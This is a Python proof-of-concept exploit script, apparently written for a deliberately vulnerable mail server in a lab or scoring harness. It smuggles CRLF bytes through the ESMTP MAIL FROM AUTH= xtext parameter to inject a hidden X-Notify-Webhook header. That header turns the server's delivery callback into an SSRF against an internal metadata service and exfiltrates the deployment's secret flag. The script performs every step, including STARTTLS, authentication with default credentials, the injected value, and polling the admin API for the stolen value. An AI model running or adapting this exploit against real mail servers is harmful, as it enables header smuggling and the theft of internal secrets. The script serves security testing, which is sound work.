#!/usr/bin/env python3
"""
PoC #2: CRLF header injection via the ESMTP MAIL FROM AUTH= xtext parameter
  -> forged X-Notify-Webhook header redirects the real delivery callback at an
     internal-only target and exfiltrates this deployment's secret
------------------------------------------------------------------------------
Location: onMailFrom() decodes the RFC 4954 ESMTP "AUTH=" parameter with
decodeXtext() (src/xtext.js) - a real encoding where "+HH" represents an
arbitrary octet, including CR/LF, so a mailbox identity can be carried
safely. RFC 3461 §4 requires rejecting a decoded value that contains CR, LF,
or NUL before using it anywhere. finishData() in src/smtp.js skips that
check and writes the decoded value straight into a stored header
("X-Original-Auth: <value>\\r\\n"). A value that decodes to real CRLF bytes
splices an arbitrary extra header line into the queued message.

Every OTHER envelope field (MAIL FROM/RCPT TO addresses themselves) IS
sanitized (sanitizeAddr() strips control characters) - this is specifically
the one exotic-extension code path that was missed.

What makes this a REAL sink, not just an inert forged header: finishData()
decides the delivery-status webhook target by re-parsing the FINAL,
persisted message's own header block (modeling a downstream DSN worker
reading the queued .eml file) - so a forged "X-Notify-Webhook:" line
injected via this bug is picked up by the EXACT SAME callback mechanism
VULN #8 fires on. It silently overrides the callback target, hidden inside
a field nothing displays to a human reviewing the visible Subject/body -
the message sent here carries NO visible X-Notify-Webhook header at all.

Scoreable impact: the forged webhook points at the shared fleet metadata
service (metadata:9000/secret/mta, see ../../metadata-service), which sits on
a `backend` network this PoC's container cannot reach directly. MTA fetches it
on our behalf and records the response body against the queued message, so we
read this deployment's real MTA_FLAG (materialized by the metadata service
from the environment - the same per-deployment secret PoC #7/#8 target) back
through the admin API. Pass/fail hinges on recovering that FLAG{...} through
the HIDDEN, injected webhook (and, when the harness exports MTA_FLAG into this
PoC's env, on it matching that exact value) - a callback merely firing at an
attacker endpoint would disclose nothing the harness minted; redirecting it at
the internal secret does. This is #8's sink reached via an invisible header,
which is what makes #2 distinct from #8's ordinary visible-header request.

(The injected header is only honored when the session is genuinely on TLS -
see VULN #4's rework: `this.tlsActive` gates whether X-Original-Auth, and
therefore this injection, is even recorded. This PoC performs a real
STARTTLS handshake first, precisely to show the bug fires even through
correctly-negotiated TLS - TLS doesn't save you from this one. Compare
04_starttls_smuggling.py, which reaches the SAME sink WITHOUT ever
completing a real handshake, by exploiting the flag/provenance gap in that
check instead.)

Run: python3 02_header_injection_webhook_redirect.py [host] [port] [admin_port] [metadata_url] [expected_flag]

If expected_flag is omitted it is read from the MTA_FLAG environment variable,
falling back to the repo's local-dev default.

Credentials (env, matching the vuln_tests compose fixture): MTA_TEST_AUTH_USER
/ MTA_TEST_AUTH_PASS, defaulting to "relay"/"relay123" if unset.
"""
import base64
import json
import os
import socket
import ssl
import sys
import time
import urllib.request
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 2525
ADMIN_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 8081
INTERNAL_URL = sys.argv[4] if len(sys.argv) > 4 else "http://metadata:9000/secret/mta"
EXPECTED_FLAG = (sys.argv[5] if len(sys.argv) > 5
                 else os.environ.get("MTA_FLAG", "FLAG{local-dev-default}"))

AUTH_USER = os.environ.get("MTA_TEST_AUTH_USER", "relay")
AUTH_PASS = os.environ.get("MTA_TEST_AUTH_PASS", "relay123")


def xtext_encode_crlf():
    return "+0D+0A"  # CR LF


def read_reply(sock, timeout=10):
    sock.settimeout(timeout)
    return sock.recv(4096).decode(errors="replace")


def cmd(sock, line, timeout=10):
    sock.sendall((line + "\r\n").encode())
    return read_reply(sock, timeout)


def reachable_directly(url):
    try:
        urllib.request.urlopen(url, timeout=3).read()
        return True
    except Exception:
        return False


def main():
    token = uuid.uuid4().hex[:8]
    crlf = xtext_encode_crlf()

    if reachable_directly(INTERNAL_URL):
        print(f"[!] note: {INTERNAL_URL} is directly reachable from here; the SSRF is still "
              f"demonstrated below, but network isolation would make it starker")
    else:
        print(f"[*] {INTERNAL_URL} is NOT directly reachable from here - good")

    # Decodes to: victim\r\nX-Notify-Webhook: http://metadata:9000/secret/mta
    auth_param = f"victim{crlf}X-Notify-Webhook:+20{INTERNAL_URL}"

    sock = socket.create_connection((HOST, PORT), timeout=10)
    read_reply(sock)
    cmd(sock, "EHLO poc.example")

    r = cmd(sock, "STARTTLS")
    if not r.startswith("220"):
        print(f"[-] STARTTLS rejected: {r.strip()}")
        return 1
    ctx = ssl._create_unverified_context()
    tls_sock = ctx.wrap_socket(sock, server_hostname=HOST)
    print(f"[*] Genuine TLS handshake completed ({tls_sock.version()})")
    cmd(tls_sock, "EHLO poc.example")

    creds = base64.b64encode(f"\0{AUTH_USER}\0{AUTH_PASS}".encode()).decode()
    r = cmd(tls_sock, f"AUTH PLAIN {creds}")
    if not r.startswith("235"):
        print(f"[-] Could not authenticate: {r.strip()}")
        return 1

    r = cmd(tls_sock, f"MAIL FROM:<a@b.example> AUTH={auth_param}")
    print(f"[*] MAIL FROM with xtext AUTH= parameter -> {r.strip()}")
    if not r.startswith("250"):
        print("[-] MAIL FROM was rejected")
        return 1

    cmd(tls_sock, "RCPT TO:<x@y.example>")
    r = cmd(tls_sock, "DATA")
    if not r.startswith("354"):
        print(f"[-] DATA rejected: {r.strip()}")
        return 1
    # Deliberately NO X-Notify-Webhook header in the visible body - the
    # callback target comes entirely from the hidden, injected header.
    r = cmd(tls_sock, f"Subject: header injection poc {token}\r\n\r\nno visible webhook header here\r\n.")
    if "queued as" not in r:
        print(f"[-] message not queued: {r.strip()}")
        return 1
    name = r.strip().split("queued as")[-1].strip()
    tls_sock.close()

    detail = json.loads(urllib.request.urlopen(f"http://{HOST}:{ADMIN_PORT}/queue/{name}", timeout=10).read())
    raw = detail["raw"]
    # The forged header DOES appear in the stored message's header block
    # (that's the injection working) - the point is it's hidden there, not
    # in the visible body content a human/reviewer would actually read.
    blank_idx = raw.find("\r\n\r\n")
    visible_body = raw[blank_idx + 4:] if blank_idx != -1 else ""
    visible_header_present = "x-notify-webhook" in visible_body.lower()
    print(f"[*] Client-authored X-Notify-Webhook mention in the VISIBLE body content: {visible_header_present}")
    if visible_header_present:
        print("[-] A visible X-Notify-Webhook header was present - this doesn't demonstrate the hidden sink")
        return 1

    # Poll the admin API for the webhook result MTA recorded against this
    # message - its captured response body is what the internal metadata
    # service returned when MTA fetched the forged URL on our behalf.
    webhook_result = None
    for _ in range(20):
        detail = json.loads(urllib.request.urlopen(f"http://{HOST}:{ADMIN_PORT}/queue/{name}", timeout=10).read())
        webhook_result = detail.get("webhook")
        if webhook_result and webhook_result.get("body"):
            break
        time.sleep(0.5)

    if not webhook_result or not webhook_result.get("body"):
        print("[-] No webhook response body recorded - the injected callback may not have fired")
        return 1

    body = webhook_result.get("body", "")
    print(f"[*] Webhook response body MTA captured from the internal target: {body[:200]!r}")

    if EXPECTED_FLAG not in body:
        print(f"[-] expected flag {EXPECTED_FLAG!r} not present in the captured response; the SSRF "
              f"may be blocked, or MTA_FLAG doesn't match the running deployment")
        return 1

    print(f"[+] SCORED: a CR/LF-injected X-Notify-Webhook (carried in the AUTH= xtext parameter, "
          f"never present in the visible Subject/body) redirected MTA's real delivery-status callback "
          f"at the internal-only metadata service and exfiltrated this deployment's real secret "
          f"{EXPECTED_FLAG!r}, read back purely over the network")
    return 0


if __name__ == "__main__":
    sys.exit(main())
